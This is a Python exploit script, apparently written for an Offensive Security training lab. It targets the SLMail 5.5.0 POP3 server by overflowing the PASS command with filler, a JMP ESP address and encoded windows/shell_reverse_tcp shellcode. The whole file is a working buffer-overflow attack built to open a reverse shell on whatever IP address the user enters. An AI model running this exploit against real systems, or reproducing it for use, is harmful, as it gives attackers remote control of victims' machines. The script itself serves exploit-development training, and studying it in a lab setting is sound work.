#!/usr/bin/python

#
# Exploit for SLMail 5.5.0 Mail Server
# Written by Jean Gonzalez
# https://github.com/Jean13
#
# Cheers to the Offensive Security team
#
# Tested on Windows 7 Enterprise SP1
#

import socket


target = raw_input("Please enter target IP address: ")


# Payload: windows/shell_reverse_tcp
# Payload size: 351 bytes
buf =  ""
buf += "\xdb\xde\xbf\x4b\xe2\x9d\xc9\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x31\x7a\x17\x03\x7a\x17\x83\x89\xe6\x7f"
buf += "\x3c\xf1\x0f\xfd\xbf\x09\xd0\x62\x49\xec\xe1\xa2\x2d"
buf += "\x65\x51\x13\x25\x2b\x5e\xd8\x6b\xdf\xd5\xac\xa3\xd0"
buf += "\x5e\x1a\x92\xdf\x5f\x37\xe6\x7e\xdc\x4a\x3b\xa0\xdd"
buf += "\x84\x4e\xa1\x1a\xf8\xa3\xf3\xf3\x76\x11\xe3\x70\xc2"
buf += "\xaa\x88\xcb\xc2\xaa\x6d\x9b\xe5\x9b\x20\x97\xbf\x3b"
buf += "\xc3\x74\xb4\x75\xdb\x99\xf1\xcc\x50\x69\x8d\xce\xb0"
buf += "\xa3\x6e\x7c\xfd\x0b\x9d\x7c\x3a\xab\x7e\x0b\x32\xcf"
buf += "\x03\x0c\x81\xad\xdf\x99\x11\x15\xab\x3a\xfd\xa7\x78"
buf += "\xdc\x76\xab\x35\xaa\xd0\xa8\xc8\x7f\x6b\xd4\x41\x7e"
buf += "\xbb\x5c\x11\xa5\x1f\x04\xc1\xc4\x06\xe0\xa4\xf9\x58"
buf += "\x4b\x18\x5c\x13\x66\x4d\xed\x7e\xef\xa2\xdc\x80\xef"
buf += "\xac\x57\xf3\xdd\x73\xcc\x9b\x6d\xfb\xca\x5c\x91\xd6"
buf += "\xab\xf2\x6c\xd9\xcb\xdb\xaa\x8d\x9b\x73\x1a\xae\x77"
buf += "\x83\xa3\x7b\xd7\xd3\x0b\xd4\x98\x83\xeb\x84\x70\xc9"
buf += "\xe3\xfb\x61\xf2\x29\x94\x08\x09\xba\x5b\x64\x11\x4f"
buf += "\x34\x77\x11\xae\x7f\xfe\xf7\xda\x6f\x57\xa0\x72\x09"
buf += "\xf2\x3a\xe2\xd6\x28\x47\x24\x5c\xdf\xb8\xeb\x95\xaa"
buf += "\xaa\x9c\x55\xe1\x90\x0b\x69\xdf\xbc\xd0\xf8\x84\x3c"
buf += "\x9e\xe0\x12\x6b\xf7\xd7\x6a\xf9\xe5\x4e\xc5\x1f\xf4"
buf += "\x17\x2e\x9b\x23\xe4\xb1\x22\xa1\x50\x96\x34\x7f\x58"
buf += "\x92\x60\x2f\x0f\x4c\xde\x89\xf9\x3e\x88\x43\x55\xe9"
buf += "\x5c\x15\x95\x2a\x1a\x1a\xf0\xdc\xc2\xab\xad\x98\xfd"
buf += "\x04\x3a\x2d\x86\x78\xda\xd2\x5d\x39\xfa\x30\x77\x34"
buf += "\x93\xec\x12\xf5\xfe\x0e\xc9\x3a\x07\x8d\xfb\xc2\xfc"
buf += "\x8d\x8e\xc7\xb9\x09\x63\xba\xd2\xff\x83\x69\xd2\xd5"


# SLMCF.DLL - JMP ESP
payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + ("\x90" * 8) + buf

try:
	print "[*] Sending evil buffer..."
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((target, 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS " + payload + "\r\n")
	print "\nDone!"

except:
	print "[!] Could not connect to POP3!"

